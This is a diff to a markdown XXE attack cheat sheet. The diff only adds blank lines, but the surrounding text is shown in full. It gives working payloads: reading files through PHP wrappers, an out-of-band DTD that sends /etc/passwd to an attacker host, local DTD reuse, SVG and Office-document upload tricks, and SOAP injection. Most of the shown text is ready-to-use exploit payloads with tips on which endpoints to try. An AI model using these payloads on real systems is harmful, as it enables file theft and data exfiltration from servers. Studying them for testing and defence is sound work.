@@ -12,6 +12,7 @@ XML External Entity. Applies wherever XML is parsed server-side — SOAP, SAML, 
 ```
 
 Access control bypass via PHP wrapper (reads restricted PHP file as base64):
+
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [
@@ -34,6 +35,7 @@ Endpoints to try: `Content-Type: application/xml`, `text/xml`, SOAP `application
 No data in response. Use parameter entities + external DTD to exfil via DNS/HTTP.
 
 Attacker hosts `evil.dtd`:
+
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?x=%file;'>">
@@ -42,6 +44,7 @@ Attacker hosts `evil.dtd`:
 ```
 
 Target request:
+
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [ <!ENTITY % ext SYSTEM "http://attacker/evil.dtd"> %ext; ]>
@@ -68,6 +71,7 @@ Error message often includes the resolved path = file contents.
 No egress for `evil.dtd`? Reuse a local DTD on disk and redefine entities.
 
 Example (Linux, Red Hat default):
+
 ```xml
 <!DOCTYPE foo [
   <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
@@ -141,16 +145,19 @@ Convert: `recode UTF8..UTF7 payload-file.xml`
 
 - DOCX/XLSX/PPTX — zip → XML files. Replace `document.xml` / `sharedStrings.xml` with XXE payload, re-zip, upload.
 - SVG upload — many avatar/image endpoints parse SVG XML:
+
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <svg><text>&xxe;</text></svg>
 ```
+
 - PDF XMP metadata, RSS/Atom feeds, KML, GPX.
 
 ## SOAP
 
 SOAP services are frequently overlooked:
+
 ```xml
 <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
   <!DOCTYPE ... >
